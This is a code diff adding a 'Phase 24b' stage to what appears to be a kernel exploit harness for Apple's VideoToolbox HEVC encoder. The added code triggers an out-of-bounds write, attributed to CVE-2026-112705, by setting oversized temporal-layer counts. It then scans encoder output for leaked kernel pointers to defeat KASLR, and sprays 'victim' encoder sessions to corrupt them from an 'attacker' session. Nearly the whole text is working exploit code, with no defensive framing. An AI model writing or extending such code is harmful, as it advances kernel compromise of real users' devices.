@@ -26252,6 +26252,306 @@ new_modes:
             }
         }
 
+        /* ============================================================
+         * Phase 24b: Encoded output analysis for KASLR leak
+         *
+         * The OOB write from CVE-2026-112705 corrupts memory AFTER
+         * the temporal layers array. This may corrupt:
+         * 1) VT session output metadata → encoded NAL size changes
+         * 2) HEVC parameter set pointers → extra psets with kernel data
+         * 3) Another VT session's structures → leaked pointers in output
+         *
+         * Strategy A: Compare encoded output (size, pset count, NAL bytes)
+         *   across TL=1 (baseline) vs TL=16,32,64,128,255 (OOB)
+         * Strategy B: Create MANY VT sessions, trigger OOB from one,
+         *   then encode from ALL — corrupted sessions leak pointers
+         * ============================================================ */
+        if (rounds == 222 || rounds == 229) {
+            rlog("\n=== Phase 24b: Encoded output KASLR leak ===\n");
+
+            /* --- Strategy A: Output size/content comparison --- */
+            rlog("\n--- 24b-A: Output comparison across TL values ---\n");
+            {
+                /* Increase saved NAL buffer for this phase */
+                #define P24B_NAL_BUF 65536
+                static uint8_t p24b_base_nal[P24B_NAL_BUF];
+                static uint8_t p24b_test_nal[P24B_NAL_BUF];
+                size_t base_nal_sz = 0, base_psets = 0, base_pset_bytes = 0;
+
+                int p24b_tl_vals[] = {1, 9, 16, 32, 64, 128, 255};
+                int p24b_ntl = sizeof(p24b_tl_vals)/sizeof(p24b_tl_vals[0]);
+
+                for (int tli = 0; tli < p24b_ntl; tli++) {
+                    int tl = p24b_tl_vals[tli];
+
+                    VTCompressionSessionRef p24b_s = NULL;
+                    CFMutableDictionaryRef p24b_es = CFDictionaryCreateMutable(
+                        kCFAllocatorDefault, 0,
+                        &kCFTypeDictionaryKeyCallBacks,
+                        &kCFTypeDictionaryValueCallBacks);
+                    CFDictionarySetValue(p24b_es,
+                        CFSTR("EnableHardwareAcceleratedVideoEncoder"),
+                        kCFBooleanTrue);
+                    OSStatus p24b_cr = VTCompressionSessionCreate(
+                        kCFAllocatorDefault, 1920, 1080,
+                        kCMVideoCodecType_HEVC, p24b_es, NULL, NULL,
+                        encode_cb, NULL, &p24b_s);
+                    CFRelease(p24b_es);
+                    if (p24b_cr != noErr || !p24b_s) {
+                        rlog("  TL=%d: session fail %d\n", tl, (int)p24b_cr);
+                        continue;
+                    }
+
+                    CFNumberRef p24b_tln = CFNumberCreate(NULL,
+                        kCFNumberIntType, &tl);
+                    VTSessionSetProperty(p24b_s,
+                        CFSTR("NumberOfTemporalLayers"), p24b_tln);
+                    CFRelease(p24b_tln);
+                    VTSessionSetProperty(p24b_s,
+                        CFSTR("RealTime"), kCFBooleanTrue);
+                    VTSessionSetProperty(p24b_s,
+                        CFSTR("AllowTemporalCompression"), kCFBooleanTrue);
+
+                    VTCompressionSessionPrepareToEncodeFrames(p24b_s);
+
+                    g_encode_done = 0; g_cb_status = -999;
+                    g_last_pset_count = 0; g_last_pset_total_bytes = 0;
+                    g_saved_nal_len = 0; g_last_nal_size = 0;
+                    encode_one(p24b_s, 0, 1920, 1080);
+                    for (int w = 0; w < 300 && !g_encode_done; w++)
+                        usleep(10000);
+
+                    size_t nal_sz = g_last_nal_size;
+                    size_t nal_saved = g_saved_nal_len;
+                    size_t psets = g_last_pset_count;
+                    size_t pset_bytes = g_last_pset_total_bytes;
+
+                    if (tl == 1) {
+                        base_nal_sz = nal_sz;
+                        base_psets = psets;
+                        base_pset_bytes = pset_bytes;
+                        size_t cp = (nal_saved > P24B_NAL_BUF) ?
+                            P24B_NAL_BUF : nal_saved;
+                        memcpy(p24b_base_nal, g_saved_nal, cp);
+                        rlog("  TL=%d (baseline): NAL=%zu psets=%zu"
+                             " psetBytes=%zu cb=%d\n",
+                            tl, nal_sz, psets, pset_bytes,
+                            (int)g_cb_status);
+                    } else {
+                        size_t cp = (nal_saved > P24B_NAL_BUF) ?
+                            P24B_NAL_BUF : nal_saved;
+                        memcpy(p24b_test_nal, g_saved_nal, cp);
+
+                        int sz_diff = (int)((long long)nal_sz -
+                            (long long)base_nal_sz);
+                        int pset_diff = (int)((long long)psets -
+                            (long long)base_psets);
+                        rlog("  TL=%d: NAL=%zu(%+d) psets=%zu(%+d)"
+                             " psetBytes=%zu cb=%d",
+                            tl, nal_sz, sz_diff, psets, pset_diff,
+                            pset_bytes, (int)g_cb_status);
+
+                        if (nal_sz != base_nal_sz)
+                            rlog(" *** SIZE DIFF ***");
+                        if (psets != base_psets)
+                            rlog(" *** PSET COUNT DIFF ***");
+                        rlog("\n");
+
+                        /* Scan NAL output for KPTR patterns */
+                        int kptr_found = 0;
+                        for (size_t qi = 0; qi + 7 < cp; qi++) {
+                            uint64_t qv;
+                            memcpy(&qv, p24b_test_nal + qi, 8);
+                            if ((qv >> 40) == 0xFFFFFE) {
+                                kptr_found++;
+                                if (kptr_found <= 5)
+                                    rlog("    NAL@%zu: 0x%llx *** KPTR ***\n",
+                                        qi, (unsigned long long)qv);
+                            }
+                        }
+                        if (kptr_found > 5)
+                            rlog("    ... and %d more KPTRs\n",
+                                kptr_found - 5);
+                        if (kptr_found)
+                            rlog("    Total KPTR in NAL: %d\n", kptr_found);
+
+                        /* Scan parameter sets for KPTR */
+                        if (g_saved_fmt) {
+                            for (size_t pi = 0; pi < psets && pi < 500; pi++) {
+                                const uint8_t *pp = NULL;
+                                size_t psz = 0;
+                                OSStatus pst =
+                                    CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
+                                        g_saved_fmt, pi, &pp, &psz,
+                                        NULL, NULL);
+                                if (pst != 0 || !pp) continue;
+                                for (size_t qi = 0; qi + 7 < psz; qi++) {
+                                    uint64_t qv;
+                                    memcpy(&qv, pp + qi, 8);
+                                    if ((qv >> 40) == 0xFFFFFE) {
+                                        rlog("    PSet[%zu]@%zu: 0x%llx"
+                                             " *** KPTR ***\n",
+                                            pi, qi, (unsigned long long)qv);
+                                    }
+                                }
+                            }
+                        }
+                    }
+
+                    VTCompressionSessionCompleteFrames(p24b_s, kCMTimeInvalid);
+                    VTCompressionSessionInvalidate(p24b_s);
+                    CFRelease(p24b_s);
+                    usleep(50000);
+                }
+            }
+
+            /* --- Strategy B: Multi-session cross-corruption --- */
+            rlog("\n--- 24b-B: Multi-session VT cross-corruption ---\n");
+            {
+                #define P24B_VICTIM_COUNT 8
+                VTCompressionSessionRef victims[P24B_VICTIM_COUNT];
+                memset(victims, 0, sizeof(victims));
+                int v_created = 0;
+
+                /* Create victim sessions first (normal TL=1) */
+                for (int vi = 0; vi < P24B_VICTIM_COUNT; vi++) {
+                    CFMutableDictionaryRef es = CFDictionaryCreateMutable(
+                        kCFAllocatorDefault, 0,
+                        &kCFTypeDictionaryKeyCallBacks,
+                        &kCFTypeDictionaryValueCallBacks);
+                    CFDictionarySetValue(es,
+                        CFSTR("EnableHardwareAcceleratedVideoEncoder"),
+                        kCFBooleanTrue);
+                    OSStatus cr = VTCompressionSessionCreate(
+                        kCFAllocatorDefault, 1920, 1080,
+                        kCMVideoCodecType_HEVC, es, NULL, NULL,
+                        encode_cb, NULL, &victims[vi]);
+                    CFRelease(es);
+                    if (cr == noErr && victims[vi]) {
+                        int tl1 = 1;
+                        CFNumberRef tln = CFNumberCreate(NULL,
+                            kCFNumberIntType, &tl1);
+                        VTSessionSetProperty(victims[vi],
+                            CFSTR("NumberOfTemporalLayers"), tln);
+                        CFRelease(tln);
+                        VTSessionSetProperty(victims[vi],
+                            CFSTR("RealTime"), kCFBooleanTrue);
+                        VTSessionSetProperty(victims[vi],
+                            CFSTR("AllowTemporalCompression"),
+                            kCFBooleanTrue);
+                        VTCompressionSessionPrepareToEncodeFrames(
+                            victims[vi]);
+                        v_created++;
+                    }
+                }
+                rlog("  Created %d victim VT sessions\n", v_created);
+
+                /* Create attacker session with large TL to trigger OOB */
+                VTCompressionSessionRef attacker = NULL;
+                {
+                    CFMutableDictionaryRef es = CFDictionaryCreateMutable(
+                        kCFAllocatorDefault, 0,
+                        &kCFTypeDictionaryKeyCallBacks,
+                        &kCFTypeDictionaryValueCallBacks);
+                    CFDictionarySetValue(es,
+                        CFSTR("EnableHardwareAcceleratedVideoEncoder"),
+                        kCFBooleanTrue);
+                    VTCompressionSessionCreate(
+                        kCFAllocatorDefault, 1920, 1080,
+                        kCMVideoCodecType_HEVC, es, NULL, NULL,
+                        encode_cb, NULL, &attacker);
+                    CFRelease(es);
+                }
+                if (attacker) {
+                    int atk_tl = 128;
+                    CFNumberRef tln = CFNumberCreate(NULL,
+                        kCFNumberIntType, &atk_tl);
+                    VTSessionSetProperty(attacker,
+                        CFSTR("NumberOfTemporalLayers"), tln);
+                    CFRelease(tln);
+                    VTSessionSetProperty(attacker,
+                        CFSTR("RealTime"), kCFBooleanTrue);
+                    VTSessionSetProperty(attacker,
+                        CFSTR("AllowTemporalCompression"),
+                        kCFBooleanTrue);
+                    VTCompressionSessionPrepareToEncodeFrames(attacker);
+
+                    /* Encode one frame on attacker (triggers OOB) */
+                    g_encode_done = 0; g_cb_status = -999;
+                    encode_one(attacker, 0, 1920, 1080);
+                    for (int w = 0; w < 300 && !g_encode_done; w++)
+                        usleep(10000);
+                    rlog("  Attacker TL=%d encode: cb=%d NAL=%zu\n",
+                        atk_tl, (int)g_cb_status,
+                        (size_t)g_last_nal_size);
+                }
+
+                /* Now encode from each victim — if the attacker's OOB
+                 * corrupted a victim's internal structures, its output
+                 * may differ or contain kernel pointers */
+                rlog("  Encoding from victims after attacker OOB...\n");
+                for (int vi = 0; vi < P24B_VICTIM_COUNT; vi++) {
+                    if (!victims[vi]) continue;
+
+                    g_encode_done = 0; g_cb_status = -999;
+                    g_last_pset_count = 0; g_last_nal_size = 0;
+                    g_saved_nal_len = 0;
+                    encode_one(victims[vi], 0, 1920, 1080);
+                    for (int w = 0; w < 300 && !g_encode_done; w++)
+                        usleep(10000);
+
+                    size_t vnal = g_last_nal_size;
+                    size_t vpsets = g_last_pset_count;
+                    rlog("    victim[%d]: cb=%d NAL=%zu psets=%zu",
+                        vi, (int)g_cb_status, vnal, vpsets);
+
+                    /* Scan for KPTR in NAL output */
+                    int vkptr = 0;
+                    size_t vcp = g_saved_nal_len;
+                    if (vcp > 4096) vcp = 4096;
+                    for (size_t qi = 0; qi + 7 < vcp; qi++) {
+                        uint64_t qv;
+                        memcpy(&qv, g_saved_nal + qi, 8);
+                        if ((qv >> 40) == 0xFFFFFE) vkptr++;
+                    }
+
+                    /* Check for abnormal cb status or size */
+                    if (g_cb_status != 0) rlog(" *** CB_ERR ***");
+                    if (vkptr > 0)
+                        rlog(" *** %d KPTR ***", vkptr);
+                    rlog("\n");
+
+                    if (vkptr > 0) {
+                        /* Dump first few KPTRs */
+                        int shown = 0;
+                        for (size_t qi = 0; qi + 7 < vcp && shown < 3;
+                             qi++) {
+                            uint64_t qv;
+                            memcpy(&qv, g_saved_nal + qi, 8);
+                            if ((qv >> 40) == 0xFFFFFE) {
+                                rlog("      NAL@%zu: 0x%llx\n",
+                                    qi, (unsigned long long)qv);
+                                shown++;
+                            }
+                        }
+                    }
+                }
+
+                /* Cleanup */
+                if (attacker) {
+                    VTCompressionSessionInvalidate(attacker);
+                    CFRelease(attacker);
+                }
+                for (int vi = 0; vi < P24B_VICTIM_COUNT; vi++) {
+                    if (victims[vi]) {
+                        VTCompressionSessionInvalidate(victims[vi]);
+                        CFRelease(victims[vi]);
+                    }
+                }
+            }
+
+            rlog("\n--- Phase 24b complete ---\n");
+        }
 
 
 
